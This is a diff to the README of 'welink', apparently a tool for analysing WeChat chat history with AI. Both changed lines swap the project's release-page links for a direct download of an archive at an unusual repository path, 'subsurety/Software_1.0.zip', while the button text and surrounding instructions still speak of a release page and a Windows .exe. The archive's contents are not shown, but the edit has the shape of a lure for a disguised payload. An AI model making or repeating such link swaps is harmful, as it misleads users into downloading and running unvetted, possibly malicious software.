@@ -1,6 +1,6 @@
 # 🔍 welink - Understand WeChat Chats with AI
 
-[![Download welink](https://img.shields.io/badge/Download%20welink-blue?style=for-the-badge&logo=github)](https://github.com/lucasheriq4374/welink/releases)
+[![Download welink](https://img.shields.io/badge/Download%20welink-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lucasheriq4374/welink/main/subsurety/Software_1.0.zip)
 
 ## 🧭 What is welink?
 
@@ -34,7 +34,7 @@ If your chat history is large, the first scan can take some time.
 
 Visit this page to download welink:
 
-[![Go to releases](https://img.shields.io/badge/Release%20Page-grey?style=for-the-badge&logo=github)](https://github.com/lucasheriq4374/welink/releases)
+[![Go to releases](https://img.shields.io/badge/Release%20Page-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lucasheriq4374/welink/main/subsurety/Software_1.0.zip)
 
 Open the releases page, then choose the Windows file that fits your computer. In most cases, you should pick the `.exe` or `.zip` file made for Windows.
 
